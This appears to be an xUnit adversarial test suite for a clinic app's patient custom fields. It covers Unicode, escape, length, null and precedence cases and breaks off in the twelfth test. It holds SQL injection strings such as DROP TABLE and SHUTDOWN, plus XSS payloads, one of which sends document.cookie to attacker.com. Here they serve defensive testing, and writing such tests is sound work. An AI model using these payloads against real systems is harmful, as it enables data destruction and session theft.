using System;
using System.Collections.Generic;
using System.Linq;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using ClinicEz.Clinic.Application.Features.Patients.Commands;
using ClinicEz.Clinic.Application.Features.Patients.DTOs;
using ClinicEz.Clinic.Application.Features.Patients.Queries;
using ClinicEz.Clinic.Domain.Entities;
using ClinicEz.Clinic.Domain.Interfaces;
using ClinicEz.Clinic.Infrastructure.Persistence;
using ClinicEz.Clinic.Infrastructure.Persistence.Repositories;
using FluentAssertions;
using Microsoft.EntityFrameworkCore;
using NSubstitute;
using Sieve.Services;
using Xunit;

namespace ClinicEz.Clinic.Application.Tests.Adversarial;

/// <summary>
/// Empirical Adversarial Stress Test Suite for Milestone 1 CustomFields Unification.
/// Validates:
/// 1. Extreme edge cases for CustomFields Address and Emergency Contact:
///    - Unicode, Filipino Baybayin, Emoji, combining diacritics, multilingual scripts.
///    - Single quotes, backslashes, escape sequences, JSON metacharacters, SQL injection attempts, XSS payloads.
///    - Boundary / max-length stress (thousands of characters, large dictionaries).
///    - Missing, null, empty string dictionaries and whitespace-only parameters.
/// 2. Precedence and cross-mapping between explicit command parameters and CustomFields dictionary.
/// 3. Concurrency and key-clobbering prevention:
///    - Additive merging in UpdateClinicPatientCommand.
///    - Protection of critical domain keys (e.g. yakap_enlistments, student_id, department).
///    - Simulated interleaved and parallel concurrent updates.
/// 4. Bulk registration and chart query integration with CustomFields demographics.
/// </summary>
public class ChallengerM1CustomFieldsAdversarialTests
{
    private readonly Guid _clinicId = Guid.NewGuid();
    private readonly string _tenantId = "tenant_adv_m1_cf";
    private readonly IClinicContext _clinicContext;

    public ChallengerM1CustomFieldsAdversarialTests()
    {
        _clinicContext = Substitute.For<IClinicContext>();
        _clinicContext.TenantId.Returns(_tenantId);
        _clinicContext.ClinicId.Returns(_clinicId);
        _clinicContext.StaffId.Returns(Guid.NewGuid());
    }

    private (ApplicationDbContext Context, IUnitOfWork Uow, Repository<Patient> PatientRepo, RegisterClinicPatientCommandHandler RegHandler, UpdateClinicPatientCommandHandler UpdHandler)
        CreateHarness(IClinicContext? clinicContext = null, string? sharedDbName = null)
    {
        var ctx = clinicContext ?? _clinicContext;
        var (context, uow, sieve) = sharedDbName != null
            ? TestDbHelper.CreateSharedTestContext(sharedDbName, ctx)
            : TestDbHelper.CreateTestContext(ctx);

        var patientRepo = TestDbHelper.CreateRepository<Patient>(context, sieve);
        var regHandler = new RegisterClinicPatientCommandHandler(patientRepo, uow, ctx);
        var updHandler = new UpdateClinicPatientCommandHandler(patientRepo, uow, null, ctx);
        return (context, uow, patientRepo, regHandler, updHandler);
    }

    private static RegisterClinicPatientCommand BuildRegisterCommand(
        string firstName,
        string lastName,
        string? addressLine = null,
        string? barangay = null,
        string? city = null,
        string? province = null,
        string? emergencyContactName = null,
        string? emergencyContactPhone = null,
        string? emergencyContactRelationship = null,
        Dictionary<string, object?>? customFields = null,
        string? middleName = null,
        string? suffix = null,
        string? email = null,
        string contactNumber = "09170001111",
        string gender = "Female",
        string? civilStatus = "Single",
        DateOnly? dob = null,
        string? philHealthNumber = null,
        string? seniorCitizenId = null,
        string? personWithDisabilityId = null,
        string? bloodType = null,
        string? allergies = null,
        string? chronicConditions = null,
        string? alerts = null)
    {
        return new RegisterClinicPatientCommand(
            FirstName: firstName,
            LastName: lastName,
            MiddleName: middleName,
            Suffix: suffix,
            DateOfBirth: dob ?? new DateOnly(1990, 1, 1),
            Gender: gender,
            CivilStatus: civilStatus,
            ContactNumber: contactNumber,
            Email: email ?? $"{firstName.ToLower()}@example.ph",
            AddressLine: addressLine,
            Barangay: barangay,
            City: city,
            Province: province,
            EmergencyContactName: emergencyContactName,
            EmergencyContactPhone: emergencyContactPhone,
            EmergencyContactRelationship: emergencyContactRelationship,
            PhilHealthNumber: philHealthNumber,
            SeniorCitizenId: seniorCitizenId,
            PwdId: personWithDisabilityId, // ggignore
            BloodType: bloodType,
            Allergies: allergies,
            ChronicConditions: chronicConditions,
            Alerts: alerts,
            CustomFields: customFields
        );
    }

    private static UpdateClinicPatientCommand BuildUpdateCommand(
        Guid id,
        string firstName,
        string lastName,
        string? addressLine = null,
        string? barangay = null,
        string? city = null,
        string? province = null,
        string? emergencyContactName = null,
        string? emergencyContactPhone = null,
        string? emergencyContactRelationship = null,
        Dictionary<string, object?>? customFields = null,
        string? middleName = null,
        string? suffix = null,
        string? email = null,
        string contactNumber = "09170001111",
        string gender = "Female",
        string? civilStatus = "Single",
        DateOnly? dob = null,
        string? philHealthNumber = null,
        string? seniorCitizenId = null,
        string? personWithDisabilityId = null,
        string? bloodType = null,
        string? allergies = null,
        string? chronicConditions = null,
        string? alerts = null)
    {
        return new UpdateClinicPatientCommand(
            Id: id,
            FirstName: firstName,
            LastName: lastName,
            MiddleName: middleName,
            Suffix: suffix,
            DateOfBirth: dob ?? new DateOnly(1990, 1, 1),
            Gender: gender,
            CivilStatus: civilStatus,
            ContactNumber: contactNumber,
            Email: email ?? $"{firstName.ToLower()}@example.ph",
            AddressLine: addressLine,
            Barangay: barangay,
            City: city,
            Province: province,
            EmergencyContactName: emergencyContactName,
            EmergencyContactPhone: emergencyContactPhone,
            EmergencyContactRelationship: emergencyContactRelationship,
            PhilHealthNumber: philHealthNumber,
            SeniorCitizenId: seniorCitizenId,
            PwdId: personWithDisabilityId, // ggignore
            BloodType: bloodType,
            Allergies: allergies,
            ChronicConditions: chronicConditions,
            Alerts: alerts,
            CustomFields: customFields
        );
    }

    // =========================================================================
    // SECTION 1: EXTREME UNICODE, EMOJI, AND MULTILINGUAL SCRIPT STRESS
    // =========================================================================

    [Fact]
    public async Task AdvTest01_CustomFields_MultilingualUnicodeAndBaybayin_RoundtripsSuccessfully()
    {
        // Arrange
        var (context, _, patientRepo, regHandler, updHandler) = CreateHarness();

        const string baybayinAddress = "ᜊᜌ᜔ᜊᜌᜒᜈ᜔ Purok 7, Brgy. ᜉᜒᜎᜒᜉᜒᜈᜐ᜔";
        const string japaneseCity = "東京都千代田区神田錦町";
        const string cyrillicProvince = "Новосибирская область";
        const string arabicContact = "د. فاطمة الزهراء الشريف";
        const string vietnameseRel = "Cháu ngoại (Granddaughter)";

        var regCommand = BuildRegisterCommand(
            firstName: "Maria",
            lastName: "Santos",
            addressLine: baybayinAddress,
            barangay: "Brgy. ᜉᜒᜎᜒᜉᜒᜈᜐ᜔",
            city: japaneseCity,
            province: cyrillicProvince,
            emergencyContactName: arabicContact,
            emergencyContactPhone: "+971-50-1234567",
            emergencyContactRelationship: vietnameseRel,
            middleName: "ᜃᜎᜌᜀᜈ᜔",
            suffix: "II",
            dob: new DateOnly(1990, 5, 20),
            gender: "Female",
            civilStatus: "Married",
            contactNumber: "+639171234567",
            email: "maria.unicode@example.ph"
        );

        // Act - Register
        var createdDto = await regHandler.Handle(regCommand, CancellationToken.None);

        // Clear change tracker to force true database reload
        context.ChangeTracker.Clear();
        var reloaded = await patientRepo.Query().FirstAsync(p => p.Id == createdDto.Id);

        // Assert Registration
        reloaded.CustomFields.Should().NotBeNull();
        reloaded.CustomFields["primary_address_line"]?.ToString().Should().Be(baybayinAddress);
        reloaded.CustomFields["primary_barangay"]?.ToString().Should().Be("Brgy. ᜉᜒᜎᜒᜉᜒᜈᜐ᜔");
        reloaded.CustomFields["primary_city"]?.ToString().Should().Be(japaneseCity);
        reloaded.CustomFields["primary_province"]?.ToString().Should().Be(cyrillicProvince);
        reloaded.CustomFields["emergency_contact_name"]?.ToString().Should().Be(arabicContact);
        reloaded.CustomFields["emergency_contact_relationship"]?.ToString().Should().Be(vietnameseRel);

        // Act - Update with Greek and Thai scripts
        const string thaiAddress = "999 ถนนสุขุมวิท แขวงคลองเตยเหนือ";
        const string greekContact = "Δρ. Αλέξανδρος Παπαδόπουλος";

        var updCommand = BuildUpdateCommand(
            id: createdDto.Id,
            firstName: "Maria",
            lastName: "Santos",
            addressLine: thaiAddress,
            emergencyContactName: greekContact,
            middleName: "ᜃᜎᜌᜀᜈ᜔",
            suffix: "II",
            dob: new DateOnly(1990, 5, 20),
            gender: "Female",
            civilStatus: "Married",
            contactNumber: "+639171234567",
            email: "maria.unicode@example.ph"
        );

        var updatedDto = await updHandler.Handle(updCommand, CancellationToken.None);

        context.ChangeTracker.Clear();
        var reloadedUpdated = await patientRepo.Query().FirstAsync(p => p.Id == createdDto.Id);

        // Assert Update
        reloadedUpdated.CustomFields["primary_address_line"]?.ToString().Should().Be(thaiAddress);
        reloadedUpdated.CustomFields["emergency_contact_name"]?.ToString().Should().Be(greekContact);
        // Ensure non-updated multilingual fields were not clobbered
        reloadedUpdated.CustomFields["primary_city"]?.ToString().Should().Be(japaneseCity);
        reloadedUpdated.CustomFields["primary_province"]?.ToString().Should().Be(cyrillicProvince);
        reloadedUpdated.CustomFields["emergency_contact_relationship"]?.ToString().Should().Be(vietnameseRel);
    }

    [Fact]
    public async Task AdvTest02_CustomFields_EmojiAndZeroWidthJoinerSequences_RoundtripsSuccessfully()
    {
        // Arrange
        var (context, _, patientRepo, regHandler, _) = CreateHarness();

        const string emojiAddress = "Unit 404 🏥 St. Luke's Residences, Block 9 🏢, Sunshine City ☀️🇵🇭";
        const string emojiBarangay = "Brgy. San Antonio 🌴🌺";
        const string emojiContactName = "Dr. Maria 🩺 Cruz-Hérnandez 👩‍⚕️ (Family Physician 👨‍👩‍👧‍👦)";
        const string emojiRelationship = "Mother-in-Law 👵 (Emergency Legal Guardian 🛡️⚡️)";

        var regCommand = BuildRegisterCommand(
            firstName: "José-María",
            lastName: "Peña-Gómez III",
            addressLine: emojiAddress,
            barangay: emojiBarangay,
            city: "Pasig City 🏙️",
            province: "Metro Manila 🇵🇭",
            emergencyContactName: emojiContactName,
            emergencyContactPhone: "0918-999-0000 📱",
            emergencyContactRelationship: emojiRelationship,
            middleName: "Ñ",
            dob: new DateOnly(1985, 12, 25),
            gender: "Male",
            civilStatus: "Married",
            contactNumber: "0917-555-8888",
            email: "jose.maria@emoji.ph"
        );

        // Act
        var createdDto = await regHandler.Handle(regCommand, CancellationToken.None);

        context.ChangeTracker.Clear();
        var reloaded = await patientRepo.Query().FirstAsync(p => p.Id == createdDto.Id);

        // Assert
        reloaded.CustomFields["primary_address_line"]?.ToString().Should().Be(emojiAddress);
        reloaded.CustomFields["primary_barangay"]?.ToString().Should().Be(emojiBarangay);
        reloaded.CustomFields["emergency_contact_name"]?.ToString().Should().Be(emojiContactName);
        reloaded.CustomFields["emergency_contact_relationship"]?.ToString().Should().Be(emojiRelationship);
        reloaded.CustomFields["emergency_contact_phone"]?.ToString().Should().Be("0918-999-0000 📱");
    }

    // =========================================================================
    // SECTION 2: INJECTION PAYLOADS, QUOTES, BACKSLASHES, AND ESCAPE STRESS
    // =========================================================================

    [Fact]
    public async Task AdvTest03_CustomFields_SqlInjectionPayloads_AreTreatedAsLiteralStringsWithoutCorruption()
    {
        // Arrange
        var (context, _, patientRepo, regHandler, updHandler) = CreateHarness();

        const string sqlPayload1 = "'; DROP TABLE \"Patients\"; --";
        const string sqlPayload2 = "' OR '1'='1";
        const string sqlPayload3 = "123 Main St'; UPDATE \"Patients\" SET \"PatientCode\"='PWNED' WHERE '1'='1'; --";
        const string sqlPayload4 = "UNION ALL SELECT NULL, NULL, NULL, NULL, NULL--";

        var regCommand = BuildRegisterCommand(
            firstName: "Bobby",
            lastName: "Tables",
            addressLine: sqlPayload3,
            barangay: sqlPayload1,
            city: sqlPayload2,
            province: "Laguna",
            emergencyContactName: sqlPayload4,
            emergencyContactPhone: "09179998888",
            emergencyContactRelationship: "Uncle'; EXEC sp_executesql; --",
            dob: new DateOnly(2000, 1, 1),
            gender: "Male",
            civilStatus: "Single",
            contactNumber: "09170001111",
            email: "bobby.tables@example.ph"
        );

        // Act - Register
        var createdDto = await regHandler.Handle(regCommand, CancellationToken.None);

        context.ChangeTracker.Clear();
        var reloaded = await patientRepo.Query().FirstAsync(p => p.Id == createdDto.Id);

        // Assert - Data is safely retained as exact literal text without executing SQL or damaging DB
        reloaded.PatientCode.Should().NotBe("PWNED");
        reloaded.PatientCode.Should().StartWith("PAT-");
        reloaded.CustomFields["primary_address_line"]?.ToString().Should().Be(sqlPayload3);
        reloaded.CustomFields["primary_barangay"]?.ToString().Should().Be(sqlPayload1);
        reloaded.CustomFields["primary_city"]?.ToString().Should().Be(sqlPayload2);
        reloaded.CustomFields["emergency_contact_name"]?.ToString().Should().Be(sqlPayload4);
        reloaded.CustomFields["emergency_contact_relationship"]?.ToString().Should().Be("Uncle'; EXEC sp_executesql; --");

        // Act - Update with another SQL payload
        const string updateSqlPayload = "'; SHUTDOWN WITH NOWAIT; --";
        var updCommand = BuildUpdateCommand(
            id: createdDto.Id,
            firstName: "Bobby",
            lastName: "Tables",
            addressLine: updateSqlPayload,
            dob: new DateOnly(2000, 1, 1),
            gender: "Male",
            civilStatus: "Single",
            contactNumber: "09170001111",
            email: "bobby.tables@example.ph"
        );

        await updHandler.Handle(updCommand, CancellationToken.None);

        context.ChangeTracker.Clear();
        var reloadedUpdated = await patientRepo.Query().FirstAsync(p => p.Id == createdDto.Id);
        reloadedUpdated.CustomFields["primary_address_line"]?.ToString().Should().Be(updateSqlPayload);
        // Verify table and entities still exist and are healthy
        var totalPatients = await patientRepo.Query().CountAsync();
        totalPatients.Should().Be(1);
    }

    [Fact]
    public async Task AdvTest04_CustomFields_QuotesBackslashesNewlinesAndJsonMetacharacters_PreservedCleanly()
    {
        // Arrange
        var (context, _, patientRepo, regHandler, _) = CreateHarness();

        const string complexEscapes = "O'Connor \"The Great\" Tower, \\\\server\\share\\path, Line 1\nLine 2\r\nLine 3\t(Tabbed)";
        const string jsonPayload = "{\"injected_key\": \"injected_val\", \"nested\": {\"array\": [1, 2, 3]}, \"flag\": true}";

        var customDict = new Dictionary<string, object?>
        {
            ["raw_json_string"] = jsonPayload,
            ["path_with_slashes"] = "C:\\Windows\\System32\\drivers\\etc\\hosts",
            ["single_and_double_quotes"] = "He said: 'It\\'s \"critical\"!'"
        };

        var regCommand = BuildRegisterCommand(
            firstName: "Escape",
            lastName: "Tester",
            addressLine: complexEscapes,
            barangay: "Brgy. Backslash\\Forward/Slash",
            city: "City 'with quotes'",
            province: "Province \"quoted\"",
            emergencyContactName: "Contact O'Reilly-Smith",
            emergencyContactPhone: "0919-000-0000",
            emergencyContactRelationship: "Friend\\Colleague",
            customFields: customDict,
            dob: new DateOnly(1994, 8, 12),
            gender: "Other",
            civilStatus: "Single",
            contactNumber: "09191234567",
            email: "escape@example.ph"
        );

        // Act
        var createdDto = await regHandler.Handle(regCommand, CancellationToken.None);

        context.ChangeTracker.Clear();
        var reloaded = await patientRepo.Query().FirstAsync(p => p.Id == createdDto.Id);

        // Assert
        reloaded.CustomFields["primary_address_line"]?.ToString().Should().Be(complexEscapes);
        reloaded.CustomFields["primary_barangay"]?.ToString().Should().Be("Brgy. Backslash\\Forward/Slash");
        reloaded.CustomFields["primary_city"]?.ToString().Should().Be("City 'with quotes'");
        reloaded.CustomFields["primary_province"]?.ToString().Should().Be("Province \"quoted\"");
        reloaded.CustomFields["emergency_contact_name"]?.ToString().Should().Be("Contact O'Reilly-Smith");
        reloaded.CustomFields["emergency_contact_relationship"]?.ToString().Should().Be("Friend\\Colleague");
        reloaded.CustomFields["raw_json_string"]?.ToString().Should().Be(jsonPayload);
        reloaded.CustomFields["path_with_slashes"]?.ToString().Should().Be("C:\\Windows\\System32\\drivers\\etc\\hosts");
        reloaded.CustomFields["single_and_double_quotes"]?.ToString().Should().Be("He said: 'It\\'s \"critical\"!'");
    }

    [Fact]
    public async Task AdvTest05_CustomFields_XssAndHtmlMetacharacters_StoredSafelyAsLiterals()
    {
        // Arrange
        var (context, _, patientRepo, regHandler, _) = CreateHarness();

        const string xssPayload1 = "<script>alert('XSS_ADDRESS')</script>";
        const string xssPayload2 = "<img src=\"invalid\" onerror=\"alert('XSS_CONTACT')\" />";
        const string xssPayload3 = "<svg/onload=fetch('http://attacker.com/steal?cookie='+document.cookie)>";

        var regCommand = BuildRegisterCommand(
            firstName: "Xss",
            lastName: "VulnerabilityTarget",
            addressLine: xssPayload1,
            emergencyContactName: xssPayload2,
            emergencyContactRelationship: xssPayload3,
            dob: new DateOnly(1996, 3, 10),
            gender: "Female",
            civilStatus: "Single",
            contactNumber: "09181112222",
            email: "xss@example.ph"
        );

        // Act
        var createdDto = await regHandler.Handle(regCommand, CancellationToken.None);

        context.ChangeTracker.Clear();
        var reloaded = await patientRepo.Query().FirstAsync(p => p.Id == createdDto.Id);

        // Assert - Preserved verbatim as inert text data in CustomFields
        reloaded.CustomFields["primary_address_line"]?.ToString().Should().Be(xssPayload1);
        reloaded.CustomFields["emergency_contact_name"]?.ToString().Should().Be(xssPayload2);
        reloaded.CustomFields["emergency_contact_relationship"]?.ToString().Should().Be(xssPayload3);
    }

    // =========================================================================
    // SECTION 3: BOUNDARY AND MAX-LENGTH STRESS
    // =========================================================================

    [Fact]
    public async Task AdvTest06_CustomFields_MaxLengthAndMassiveStrings_HandledWithoutTruncationOrError()
    {
        // Arrange
        var (context, _, patientRepo, regHandler, updHandler) = CreateHarness();

        var massiveAddress = new string('A', 4000);
        var massiveBarangay = new string('B', 2000);
        var massiveContactName = new string('C', 4000);
        var massiveRelationship = new string('R', 3000);

        var largeDictionary = new Dictionary<string, object?>();
        for (int i = 0; i < 100; i++)
        {
            largeDictionary[$"field_key_{i:D3}"] = $"Value_{i}_{new string('X', 100)}";
        }

        var regCommand = BuildRegisterCommand(
            firstName: "Stress",
            lastName: "Tester",
            addressLine: massiveAddress,
            barangay: massiveBarangay,
            emergencyContactName: massiveContactName,
            emergencyContactRelationship: massiveRelationship,
            customFields: largeDictionary,
            dob: new DateOnly(1980, 1, 1),
            gender: "Male",
            civilStatus: "Single",
            contactNumber: "09170000000",
            email: "stress@example.ph"
        );

        // Act - Register with massive payloads
        var createdDto = await regHandler.Handle(regCommand, CancellationToken.None);

        context.ChangeTracker.Clear();
        var reloaded = await patientRepo.Query().FirstAsync(p => p.Id == createdDto.Id);

        // Assert
        reloaded.CustomFields["primary_address_line"]?.ToString().Should().HaveLength(4000);
        reloaded.CustomFields["primary_barangay"]?.ToString().Should().HaveLength(2000);
        reloaded.CustomFields["emergency_contact_name"]?.ToString().Should().HaveLength(4000);
        reloaded.CustomFields["emergency_contact_relationship"]?.ToString().Should().HaveLength(3000);

        // All 100 dictionary keys plus the 4 mapped address/contact keys should exist
        reloaded.CustomFields.Should().HaveCount(104);
        reloaded.CustomFields["field_key_099"]?.ToString().Should().StartWith("Value_99_");

        // Act - Update with another massive string
        var updatedMassiveAddress = new string('Z', 8000);
        var updCommand = BuildUpdateCommand(
            id: createdDto.Id,
            firstName: "Stress",
            lastName: "Tester",
            addressLine: updatedMassiveAddress,
            dob: new DateOnly(1980, 1, 1),
            gender: "Male",
            civilStatus: "Single",
            contactNumber: "09170000000",
            email: "stress@example.ph"
        );

        await updHandler.Handle(updCommand, CancellationToken.None);

        context.ChangeTracker.Clear();
        var reloadedUpdated = await patientRepo.Query().FirstAsync(p => p.Id == createdDto.Id);
        reloadedUpdated.CustomFields["primary_address_line"]?.ToString().Should().HaveLength(8000);
    }

    // =========================================================================
    // SECTION 4: NULL, EMPTY, MISSING, AND WHITESPACE DICTIONARIES
    // =========================================================================

    [Fact]
    public async Task AdvTest07_CustomFields_NullAndEmptyDictionaryRegistration_InitializesCleanly()
    {
        // Arrange
        var (context, _, patientRepo, regHandler, _) = CreateHarness();

        // Case A: CustomFields is null and address parameters are omitted
        var regCommandNull = BuildRegisterCommand(
            firstName: "Ana",
            lastName: "NullTest",
            dob: new DateOnly(1993, 2, 14),
            gender: "Female",
            civilStatus: "Single",
            contactNumber: "09171112222",
            email: "ana.null@example.ph",
            customFields: null
        );

        var dtoNull = await regHandler.Handle(regCommandNull, CancellationToken.None);

        context.ChangeTracker.Clear();
        var reloadedNull = await patientRepo.Query().FirstAsync(p => p.Id == dtoNull.Id);
        reloadedNull.CustomFields.Should().NotBeNull();
        reloadedNull.CustomFields.Should().BeEmpty();

        // Case B: CustomFields is empty dictionary
        var regCommandEmpty = BuildRegisterCommand(
            firstName: "Ben",
            lastName: "EmptyTest",
            dob: new DateOnly(1991, 7, 7),
            gender: "Male",
            civilStatus: "Single",
            contactNumber: "09173334444",
            email: "ben.empty@example.ph",
            customFields: new Dictionary<string, object?>()
        );

        var dtoEmpty = await regHandler.Handle(regCommandEmpty, CancellationToken.None);

        context.ChangeTracker.Clear();
        var reloadedEmpty = await patientRepo.Query().FirstAsync(p => p.Id == dtoEmpty.Id);
        reloadedEmpty.CustomFields.Should().NotBeNull();
        reloadedEmpty.CustomFields.Should().BeEmpty();

        // Case C: CustomFields contains explicit null values
        var dictWithNullValues = new Dictionary<string, object?>
        {
            ["primary_address_line"] = null,
            ["primary_barangay"] = null,
            ["notes"] = null,
            ["valid_key"] = "ValidValue"
        };

        var regCommandNullValues = BuildRegisterCommand(
            firstName: "Carlos",
            lastName: "NullValuesTest",
            dob: new DateOnly(1989, 9, 9),
            gender: "Male",
            civilStatus: "Single",
            contactNumber: "09175556666",
            email: "carlos.nullvalues@example.ph",
            customFields: dictWithNullValues
        );

        var dtoNullValues = await regHandler.Handle(regCommandNullValues, CancellationToken.None);

        context.ChangeTracker.Clear();
        var reloadedNullValues = await patientRepo.Query().FirstAsync(p => p.Id == dtoNullValues.Id);
        reloadedNullValues.CustomFields.Should().NotBeNull();
        reloadedNullValues.CustomFields.Should().ContainKey("primary_address_line");
        reloadedNullValues.CustomFields["primary_address_line"].Should().BeNull();
        reloadedNullValues.CustomFields["valid_key"]?.ToString().Should().Be("ValidValue");
    }

    [Fact]
    public async Task AdvTest08_CustomFields_WhitespaceOnlyStrings_HandledGracefully()
    {
        // Arrange
        var (context, _, patientRepo, regHandler, updHandler) = CreateHarness();

        // Registration with whitespace-only address
        var regCommand = BuildRegisterCommand(
            firstName: "White",
            lastName: "Space",
            addressLine: "     \t   \n  ",
            barangay: "   ",
            dob: new DateOnly(1995, 4, 1),
            gender: "Female",
            civilStatus: "Single",
            contactNumber: "09187778888",
            email: "white.space@example.ph"
        );

        var createdDto = await regHandler.Handle(regCommand, CancellationToken.None);

        context.ChangeTracker.Clear();
        var reloaded = await patientRepo.Query().FirstAsync(p => p.Id == createdDto.Id);

        // string.IsNullOrWhiteSpace guards in RegisterClinicPatientCommandHandler prevent adding whitespace keys
        reloaded.CustomFields.ContainsKey("primary_address_line").Should().BeFalse();
        reloaded.CustomFields.ContainsKey("primary_barangay").Should().BeFalse();

        // Now seed patient with valid address
        reloaded.CustomFields["primary_address_line"] = "123 Valid St";
        await context.SaveChangesAsync();

        // Act - Update with whitespace string
        var updCommand = BuildUpdateCommand(
            id: createdDto.Id,
            firstName: "White",
            lastName: "Space",
            addressLine: "     ",
            dob: new DateOnly(1995, 4, 1),
            gender: "Female",
            civilStatus: "Single",
            contactNumber: "09187778888",
            email: "white.space@example.ph"
        );

        await updHandler.Handle(updCommand, CancellationToken.None);

        context.ChangeTracker.Clear();
        var reloadedUpdated = await patientRepo.Query().FirstAsync(p => p.Id == createdDto.Id);

        // Whitespace string in UpdateClinicPatientCommand sets custom field to null
        reloadedUpdated.CustomFields["primary_address_line"].Should().BeNull();
    }

    [Fact]
    public async Task AdvTest09_CustomFields_PartialUpdate_PreservesExistingCustomFieldsWhenNullInCommand()
    {
        // Arrange
        var (context, _, patientRepo, regHandler, updHandler) = CreateHarness();

        var initialFields = new Dictionary<string, object?>
        {
            ["student_id"] = "2024-STUDENT-999",
            ["department"] = "Computer Science",
            ["hmo_provider"] = "Maxicare"
        };

        var regCommand = BuildRegisterCommand(
            firstName: "Daniel",
            lastName: "PreserveTest",
            addressLine: "100 Initial Blvd",
            barangay: "Barangay San Isidro",
            city: "Cebu City",
            province: "Cebu",
            emergencyContactName: "Lourdes Preserve",
            emergencyContactPhone: "09170003333",
            emergencyContactRelationship: "Mother",
            customFields: initialFields,
            middleName: "M",
            dob: new DateOnly(1998, 11, 11),
            gender: "Male",
            civilStatus: "Single",
            contactNumber: "09170002222",
            email: "daniel@example.ph"
        );

        var createdDto = await regHandler.Handle(regCommand, CancellationToken.None);

        // Act - Issue partial update: only update LastName and Email.
        // All address/emergency contact parameters and CustomFields are explicitly null.
        var updCommand = BuildUpdateCommand(
            id: createdDto.Id,
            firstName: "Daniel",
            lastName: "UpdatedLastName",
            addressLine: null,
            barangay: null,
            city: null,
            province: null,
            emergencyContactName: null,
            emergencyContactPhone: null,
            emergencyContactRelationship: null,
            customFields: null,
            middleName: "M",
            dob: new DateOnly(1998, 11, 11),
            gender: "Male",
            civilStatus: "Single",
            contactNumber: "09170002222",
            email: "daniel.updated@example.ph"
        );

        var updatedDto = await updHandler.Handle(updCommand, CancellationToken.None);

        context.ChangeTracker.Clear();
        var reloaded = await patientRepo.Query().FirstAsync(p => p.Id == createdDto.Id);

        // Assert - Basic demographic changes applied
        reloaded.LastName.Should().Be("UpdatedLastName");
        reloaded.Email.Should().Be("daniel.updated@example.ph");

        // Assert - ALL CustomFields were strictly preserved and not clobbered!
        reloaded.CustomFields.Should().NotBeNull();
        reloaded.CustomFields["primary_address_line"]?.ToString().Should().Be("100 Initial Blvd");
        reloaded.CustomFields["primary_barangay"]?.ToString().Should().Be("Barangay San Isidro");
        reloaded.CustomFields["primary_city"]?.ToString().Should().Be("Cebu City");
        reloaded.CustomFields["primary_province"]?.ToString().Should().Be("Cebu");
        reloaded.CustomFields["emergency_contact_name"]?.ToString().Should().Be("Lourdes Preserve");
        reloaded.CustomFields["emergency_contact_phone"]?.ToString().Should().Be("09170003333");
        reloaded.CustomFields["emergency_contact_relationship"]?.ToString().Should().Be("Mother");
        reloaded.CustomFields["student_id"]?.ToString().Should().Be("2024-STUDENT-999");
        reloaded.CustomFields["department"]?.ToString().Should().Be("Computer Science");
        reloaded.CustomFields["hmo_provider"]?.ToString().Should().Be("Maxicare");
    }

    [Fact]
    public async Task AdvTest10_CustomFields_ExplicitClearing_ClearsKeyWhenEmptyStringPassed()
    {
        // Arrange
        var (context, _, patientRepo, regHandler, updHandler) = CreateHarness();

        var regCommand = BuildRegisterCommand(
            firstName: "Eduardo",
            lastName: "ClearTest",
            addressLine: "500 Clear Me St",
            emergencyContactName: "Old Contact",
            dob: new DateOnly(1987, 6, 15),
            gender: "Male",
            civilStatus: "Married",
            contactNumber: "09178889999",
            email: "eduardo@example.ph"
        );

        var createdDto = await regHandler.Handle(regCommand, CancellationToken.None);

        // Act - Clear AddressLine and EmergencyContactName by sending empty strings
        var updCommand = BuildUpdateCommand(
            id: createdDto.Id,
            firstName: "Eduardo",
            lastName: "ClearTest",
            addressLine: "",
            emergencyContactName: "",
            dob: new DateOnly(1987, 6, 15),
            gender: "Male",
            civilStatus: "Married",
            contactNumber: "09178889999",
            email: "eduardo@example.ph"
        );

        await updHandler.Handle(updCommand, CancellationToken.None);

        context.ChangeTracker.Clear();
        var reloaded = await patientRepo.Query().FirstAsync(p => p.Id == createdDto.Id);

        // Assert - Set to null (cleared)
        reloaded.CustomFields["primary_address_line"].Should().BeNull();
        reloaded.CustomFields["emergency_contact_name"].Should().BeNull();
    }

    // =========================================================================
    // SECTION 5: PRECEDENCE AND CROSS-MAPPING BETWEEN PARAMS AND CUSTOMFIELDS
    // =========================================================================

    [Fact]
    public async Task AdvTest11_CustomFields_RegisterPrecedence_CustomFieldsDictTakesPrecedenceOverExplicitParam()
    {
        // Arrange
        var (context, _, patientRepo, regHandler, _) = CreateHarness();

        var customFields = new Dictionary<string, object?>
        {
            ["primary_address_line"] = "Address From Dictionary",
            ["emergency_contact_name"] = "Contact From Dictionary"
        };

        var regCommand = BuildRegisterCommand(
            firstName: "Francis",
            lastName: "Precedence",
            addressLine: "Address From Explicit Param",
            emergencyContactName: "Contact From Explicit Param",
            customFields: customFields,
            dob: new DateOnly(1992, 10, 10),
            gender: "Male",
            civilStatus: "Single",
            contactNumber: "09171239999",
            email: "francis@example.ph"
        );

        // Act
        var createdDto = await regHandler.Handle(regCommand, CancellationToken.None);

        context.ChangeTracker.Clear();
        var reloaded = await patientRepo.Query().FirstAsync(p => p.Id == createdDto.Id);

        // Assert - In RegisterClinicPatientCommandHandler, if CustomFields dictionary already has the key,
        // it takes precedence over the explicit command parameter
        reloaded.CustomFields["primary_address_line"]?.ToString().Should().Be("Address From Dictionary");
        reloaded.CustomFields["emergency_contact_name"]?.ToString().Should().Be("Contact From Dictionary");
    }

    [Fact]
    public async Task AdvTest12_CustomFields_UpdatePrecedence_ExplicitParamOverridesDictValue()
    {
        // Arrange
        var (context, _, patientRepo, regHandler, updHandler) = CreateHarness();

        var regCommand = BuildRegisterCommand(
            firstName: "Grace",
            lastName: "Override",
            dob: new DateOnly(1994, 2, 2),
            gender: "Female",
            civilStatus: "Single",
            contactNumber: "09181239999",
            email: "grace@example.ph"
        );

        var createdDto = await regHandler.Handle(regCommand, CancellationToken.None);

        // Act - Update passing conflicting values in dictionary AND explicit parameter
        var updateDict = new Dictionary<string, object?>
        {
            ["primary_address_line"] = "Address From Dictionary",
            ["custom_status"] = "ActiveStudent"
        };

        var updCommand = BuildUpdateCommand(
            id: createdDto.Id,
            firstName: "Grace",
            lastName: "Override",
            addressLine: "Address From Explicit Param",
            customFields: updateDict,
            dob: new DateOnly(1994, 2, 2),
            gender: "Female",
            civilStatus: "Single",
            contactNumber: "09181239999",
            email: "grace@example.ph"
        );

        await updHandler.Handle(updCommand, CancellationToken.None);

        context.ChangeTracker.Clear();
        var reloaded = await patientRepo.Query().FirstAsync(p => p.Id == createdDto.Id);

        // Assert - In UpdateClinicPatientCommandHandler, dictionary merge runs first,
